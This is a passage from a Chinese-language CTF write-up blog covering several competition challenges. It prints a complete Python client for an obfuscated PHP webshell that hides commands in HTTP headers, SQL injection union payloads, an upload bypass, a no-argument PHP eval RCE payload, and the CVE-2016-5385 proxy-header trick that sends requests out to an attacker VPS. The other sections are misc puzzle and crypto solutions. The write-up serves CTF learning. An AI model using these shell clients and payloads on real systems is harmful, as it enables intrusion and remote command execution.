ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(x(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>马子还臭还长，直接搜马子里关键代码，<code>https://www.jianshu.com/p/c8099299ac2a</code><br>当时看的不是这个师傅的文章，当时的找不到了，都一样，python一建利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span>(<span class="params">seq, amount</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt &lt; lenTxt <span class="keyword">and</span> iKey &lt; lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;3481&quot;</span>  <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;9d7b&quot;</span>  <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://42.192.64.28:8083/shell.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span>  <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages, <span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>, <span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload, xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url, headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>: acceptLangStr, <span class="string">&#x27;Referer&#x27;</span>: refe                                                                                   rer&#125;, proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey, xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output, xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>改掉中间的url和key就可以了，py2的<br><img src="/images/tjuctf/6.png" alt="image-20220124201741117"><br>直接打就行了，具体原因嘛，还需要继续研究研究</p><h5 id="这个doc不对劲"><a href="#这个doc不对劲" class="headerlink" title="这个doc不对劲"></a>这个doc不对劲</h5><p>这个题好玩，比较有趣，但是中间出现了一些意外，不过无伤大雅<br>下载附件，是个doc，显然60M+的doc不太现实，直接改成zip包<br>有一个key.txt，预览看不太正常，可能是0宽，网站打一下<br><img src="/images/tjuctf/7.png" alt="image-20220124202818555"><br>刚开始以为要掩码爆破，但是没跑出来，问了下出题人，题有些问题，直接给密码了解一下压缩包<br><code>Because I like naruto best</code><br>解一下压缩包，可以看到有许多图片，一共129488张，看小图片是两种不一样的图片，盲猜转01，八个为一位，转ascii转出来就可以了，人工肯定不现实，贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = 104329</span></span><br><span class="line"><span class="comment"># for i in range(300,400):</span></span><br><span class="line"><span class="comment">#     if int(i)*int(i)==a:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\tj\\tjtest.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130000</span>):</span><br><span class="line">    <span class="comment">#八个为一组八个后输出回车</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(i)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#读取所有文件夹下图片，根据getsize判断</span></span><br><span class="line">    a=os.path.getsize(<span class="string">&#x27;C:\\Users\\xin\\Desktop\\love\\out\\&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">262</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        fi.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tj\\tjtest.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        i = i.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是getsize是判断图片的字节<br><img src="/images/tjuctf/8.png" alt="image-20220124203834234"><br>运行出来，是base64图片，直接复制到浏览器就好了<br><img src="/images/tjuctf/9.png" alt="image-20220124204133045"><br><img src="/images/tjuctf/10.png" alt="image-20220125181954185"><br>输出的东西直接放到浏览器运行就可以了</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h5><p>sql注入没有任何过滤,直接打就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(schema_name),version(),version() from information_schema.schemata-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(table_name),version(),version() from information_schema.tables where table_schema=&#x27;CTF&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(column_name),version(),version() from information_schema.columns where table_schema=&#x27;CTF&#x27; and table_name=&#x27;flag&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),flag,null,null from CTF.flag-- -</span><br></pre></td></tr></table></figure><h5 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h5><p>文件上传，前端检测，先上传一个png图片抓包，然后改后缀，cat  /flag即可<br><img src="/images/tjuctf/11.png" alt="image-20220125194611835"></p><h5 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h5><p>ctfshow反序列化原题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>运行脚本,<img src="/images/tjuctf/12.png" alt="image-20220125195719749"><br>打一下就可以了,这里要注意一下url编码一下</p><h5 id="RCE-fun"><a href="#RCE-fun" class="headerlink" title="RCE_fun"></a>RCE_fun</h5><p>emmm  不会，后来看了下wp，emmm还可以这样  以为是原题，后面研究一下</p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h5 id="modulus"><a href="#modulus" class="headerlink" title="modulus"></a>modulus</h5><p>给了一个大n，e1和e2，c1，c2，共模攻击直接一把梭<br><img src="/images/tjuctf/13.png" alt="image-20220125200608676"></p><h4 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h4><p>emmmm 不能算做出来吧，直接软件一把梭的，<br><img src="/images/tjuctf/14.png" alt=" "></p><p><img src="/images/tjuctf/15.png" alt="image-20220125193800648"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>太菜了，cscms没做出来，中间搜了一个上传漏洞眉也没有打通，就没管了。<br>一直在路上</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫网络安全卫士守护赛</title>
      <link href="/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了源码，我们看到<code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; </code>这里正则匹配了输入的code字符，有参数就会替换为空。也就是说我们可以<code>?code=phpinfo();</code>就会显示phpinfo信息，但是如果<code>system(&#39;ls&#39;);</code>这样就会被过滤，也就是说括号里不能有参数，可以这样<code>a(b())</code>,但是不能这样<code>a(&#39;b&#39;)</code>，就是无参数rce。<br>这边我看到题<code>if(!preg_match(&#39;/session|end|next|header|dir/i&#39;,$_GET[&#39;code&#39;]))&#123;</code><br>对一些字符进行了过滤，正常我们有两种选择一种rce，一种文件读取，<br>题目也给我们了 提示rce，因为这里过滤了end，header，session，所以我们使用<code>get_defined_vars ()</code>函数<br>get_defined_vars()：返回由所有已定义变量所组成的数组<br><img src="/images/changanzhanyi/1.png" alt="1"><br>get传参后数组里就会有get传递的值</p><p>current : 返回数组中的当前单元，每个数组中都有一个内部的指针指向它“当前的”单元，初始指向插入到数组中的第一个单元。</p><p>和current类似的函数<br>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>next() - 将内部指针指向数组中的下一个元素，并输出。<br>prev() - 将内部指针指向数组中的上一个元素，并输出。<br>reset() - 将内部指针指向数组中的第一个元素，并输出。<br>each() - 返回当前元素的键名和键值，并将内部指针向前移动。</p><p>a=eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br>构造payload<br>这里过滤了end  最后一个元素，我们可以用reset也就是第一个元素<br>把传递的参数写前面，这样<code>a=phpinfo();&amp;code=eval(reset(current(get_defined_vars())))</code><br>随便传一个参数，但是要放在最前面这样的话就可以进行rce了<br><img src="/images/changanzhanyi/2.png" alt="image-20220118141207013"></p><h5 id="flag配送中心"><a href="#flag配送中心" class="headerlink" title="flag配送中心"></a>flag配送中心</h5><p>emmmm太菜了  不会，右键源代码有提示，<!--Powered by PHP 5.6.23 + fastcgi--><br>复现一下，<code>CVE-2016-5385 </code><br>抓包，包里加上<code>Proxy: http://xxx.xxx.xxx.xxx:xxxx/</code><br>就可以了，vps监听一下，详细，百度 cve-2016-5385<br><img src="/images/changanzhanyi/31.png" alt="image-20220120164323864"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h5><p>拿到压缩包，是一个流量包，放到network流量看到有一个secret.txt和hint.txt的流量包不一样大，直接右键提出来，<br><img src="/images/changanzhanyi/3.png" alt="image-20220118151527186"><br><img src="/images/changanzhanyi/4.png" alt="image-20220118151613193"><br><img src="/images/changanzhanyi/5.png" alt="image-20220118152247852"><br>显然这里base64转一下secret内容pk开头是一个zip包，我们保存下来，改一下后缀，解压一下里面是很多图片，拼图，再看一下hint.txt,<br><img src="/images/changanzhanyi/6.png" alt="image-20220118152825786"><br>base32的提示，然后就可以愉快的拼图了。<br>手工拼图很累，我们这里使用工具<br><img src="/images/changanzhanyi/7.png" alt="image-20220118154452731"><br><img src="/images/changanzhanyi/8.png" alt="image-20220118154522615"><br>先看下信息，每个小图片都是100*100的总共49个项目，去掉dsstore 还剩48个，可能是6x8的，也可能是4x12，这里用4x12的 把所有的小图片用<code>montage</code>拼成一个大图片，然后用<code>gaps</code>进行还原<br><code>montage *png -tile 12x4 -geometry 100x100+0+0 out.png</code><br>-tile是拼接时每行和每列的图片数。这里用12x4，就是12列4行，也就是长12张图片高4张<br>-geometry是每个小图片的像素，后面的+0+0是边框是0，<br><img src="/images/changanzhanyi/9.png" alt="image-20220118160159420"><br>拼成一个大图片后，直接用gaps,我们不能确定generations，可以加个version，它可以一个个显示，多运行几遍，中间看那个清楚，截图就可以了<br><code>gaps --image=out1.png --generations=100 --population=48 --size=100 --verbose</code><br>–image            指向拼图的路径<br>–size            拼图块的像素尺寸<br>–generations    遗传算法的代的数量<br>–population    个体数量<br>–verbose        每一代训练结束后展示最佳结果<br>–save            将拼图还原为图像<br><img src="/images/changanzhanyi/10.png" alt="image-20220118161022716"></p><h5 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h5><p>下载附件后，是一个文件file一下<br><img src="/images/changanzhanyi/11.png" alt="image-20220118171304054"><br>是一个class文件，果断改成.class后拖到jd-gui里，看起来像是asccii，很长，脚本<br><img src="/images/changanzhanyi/12.png" alt="image-20220118171417093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 